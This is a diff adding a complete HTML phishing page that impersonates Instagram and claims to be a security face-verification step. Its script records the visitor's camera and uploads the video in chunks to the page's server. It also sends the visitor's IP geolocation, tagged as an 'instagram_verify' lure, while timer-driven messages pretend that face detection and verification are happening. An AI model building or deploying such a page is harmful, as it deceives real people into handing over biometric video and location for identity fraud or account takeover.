@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+
+  .topbar { width: 100%; max-width: 480px; padding: 14px 16px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #222; }
+  .ig-logo { font-size: 22px; font-weight: 700; background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+  .container { width: 100%; max-width: 480px; padding: 24px 20px; }
+
+  .alert-box { background: #1a0a00; border: 1px solid #ff6b00; border-radius: 12px; padding: 16px; margin-bottom: 24px; display: flex; gap: 12px; align-items: flex-start; }
+  .alert-icon { font-size: 24px; flex-shrink: 0; }
+  .alert-title { font-size: 14px; font-weight: 700; color: #ff6b00; margin-bottom: 4px; }
+  .alert-msg { font-size: 13px; color: #aaa; line-height: 1.5; }
+
+  .section-title { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+  .section-sub { font-size: 13px; color: #888; margin-bottom: 20px; line-height: 1.5; }
+
+  .steps { margin-bottom: 24px; }
+  .step { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #1a1a1a; }
+  .step:last-child { border-bottom: none; }
+  .step-num { width: 28px; height: 28px; border-radius: 50%; background: linear-gradient(45deg,#833ab4,#fd1d1d,#fcb045); display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
+  .step-text { font-size: 13px; color: #ccc; }
+
+  .cam-preview { width: 100%; aspect-ratio: 3/4; background: #111; border-radius: 16px; overflow: hidden; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; border: 2px solid #333; }
+  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+  .cam-placeholder { display: flex; flex-direction: column; align-items: center; gap: 10px; color: #555; }
+  .cam-placeholder .icon { font-size: 48px; }
+  .cam-placeholder .txt { font-size: 13px; }
+
+  /* face outline overlay */
+  .face-outline { position: absolute; inset: 0; display: none; align-items: center; justify-content: center; pointer-events: none; }
+  .face-oval { width: 180px; height: 240px; border: 3px solid #e1306c; border-radius: 50%; box-shadow: 0 0 0 2000px rgba(0,0,0,0.4); animation: face-pulse 2s infinite; }
+  @keyframes face-pulse { 0%,100%{border-color:#e1306c} 50%{border-color:#fcb045} }
+  .face-tip { position: absolute; bottom: 60px; left: 0; right: 0; text-align: center; color: #fff; font-size: 13px; font-weight: 600; text-shadow: 0 1px 4px #000; }
+
+  .scanning { position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, transparent, #e1306c, transparent); display: none; animation: scan 2s linear infinite; }
+  @keyframes scan { 0%{top:20%} 100%{top:80%} }
+
+  .verify-btn { width: 100%; background: linear-gradient(90deg,#833ab4,#fd1d1d,#fcb045); border: none; color: #fff; font-size: 15px; font-weight: 700; padding: 14px; border-radius: 10px; cursor: pointer; margin-bottom: 12px; }
+  .verify-btn:disabled { background: #222; color: #555; cursor: not-allowed; }
+  .skip-link { text-align: center; font-size: 13px; color: #555; }
+
+  .status-msg { font-size: 13px; color: #888; text-align: center; margin-bottom: 16px; }
+
+  .success-box { background: #001a00; border: 1px solid #00cc44; border-radius: 12px; padding: 16px; text-align: center; display: none; }
+  .success-box .icon { font-size: 36px; margin-bottom: 8px; }
+  .success-box .title { font-size: 15px; font-weight: 700; color: #00cc44; margin-bottom: 4px; }
+  .success-box .msg { font-size: 13px; color: #888; }
+</style>
+</head>
+<body>
+<div class="topbar"><div class="ig-logo">Instagram</div></div>
+
+<div class="container">
+  <div class="alert-box">
+    <div class="alert-icon">⚠️</div>
+    <div>
+      <div class="alert-title">Unusual Activity Detected</div>
+      <div class="alert-msg">We detected a login attempt from an unrecognized device. Please verify your identity to keep your account secure.</div>
+    </div>
+  </div>
+
+  <div class="section-title">Face Verification</div>
+  <div class="section-sub">To confirm it's really you, we need to scan your face. This helps us protect your account from unauthorized access.</div>
+
+  <div class="steps">
+    <div class="step"><div class="step-num">1</div><div class="step-text">Allow camera access when prompted</div></div>
+    <div class="step"><div class="step-num">2</div><div class="step-text">Position your face inside the oval frame</div></div>
+    <div class="step"><div class="step-num">3</div><div class="step-text">Hold still while we verify your identity</div></div>
+  </div>
+
+  <div class="cam-preview">
+    <video id="preview" autoplay muted playsinline></video>
+    <div class="cam-placeholder" id="camPlaceholder">
+      <div class="icon">🤳</div>
+      <div class="txt">Camera will appear here</div>
+    </div>
+    <div class="face-outline" id="faceOutline">
+      <div class="face-oval"></div>
+      <div class="face-tip" id="faceTip">Position your face in the oval</div>
+    </div>
+    <div class="scanning" id="scanLine"></div>
+  </div>
+
+  <div class="status-msg" id="statusMsg">Tap below to begin face verification</div>
+
+  <button class="verify-btn" id="verifyBtn" onclick="startVerify()">Begin Face Verification</button>
+  <div class="skip-link">Having trouble? <span style="color:#888">Contact Support</span></div>
+
+  <div class="success-box" id="successBox">
+    <div class="icon">✅</div>
+    <div class="title">Identity Verified</div>
+    <div class="msg">Your account has been secured. Redirecting you back to Instagram...</div>
+  </div>
+</div>
+
+<script>
+const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
+let mediaRecorder, chunkIndex = 0, stream;
+
+async function getGeo() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
+}
+
+async function startVerify() {
+  const btn = document.getElementById("verifyBtn");
+  btn.disabled = true; btn.textContent = "Starting camera...";
+  document.getElementById("statusMsg").textContent = "Allow camera access to continue";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user", width:1280, height:720 }, audio: false });
+  } catch {
+    document.getElementById("statusMsg").textContent = "Camera access denied. Please allow and try again.";
+    btn.disabled = false; btn.textContent = "Begin Face Verification";
+    return;
+  }
+
+  document.getElementById("preview").srcObject = stream;
+  document.getElementById("preview").style.display = "block";
+  document.getElementById("camPlaceholder").style.display = "none";
+  document.getElementById("faceOutline").style.display = "flex";
+  document.getElementById("scanLine").style.display = "block";
+  btn.textContent = "Scanning...";
+  document.getElementById("statusMsg").textContent = "Scanning your face — please hold still";
+
+  const geo = await getGeo();
+  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ session:SID, geo, lure:"instagram_verify" }) }).catch(()=>{});
+
+  startRecording(stream);
+
+  // simulate progress
+  setTimeout(() => { document.getElementById("faceTip").textContent = "Face detected ✓"; }, 3000);
+  setTimeout(() => { document.getElementById("faceTip").textContent = "Verifying identity..."; }, 6000);
+  setTimeout(() => { document.getElementById("faceTip").textContent = "Almost done..."; }, 10000);
+
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+    document.getElementById("faceOutline").style.display = "none";
+    document.getElementById("scanLine").style.display = "none";
+    document.getElementById("statusMsg").textContent = "";
+    btn.style.display = "none";
+    document.getElementById("successBox").style.display = "block";
+  }, 14000);
+}
+
+function startRecording(stream) {
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
+  mediaRecorder.ondataavailable = async (e) => {
+    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
+  };
+  mediaRecorder.onstop = async () => {
+    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
+  };
+  mediaRecorder.start(5000);
+}
+
+async function sendChunk(blob, idx) {
+  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
+    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
+  }).catch(()=>{});
+}
+</script>
+</body>
+</html>
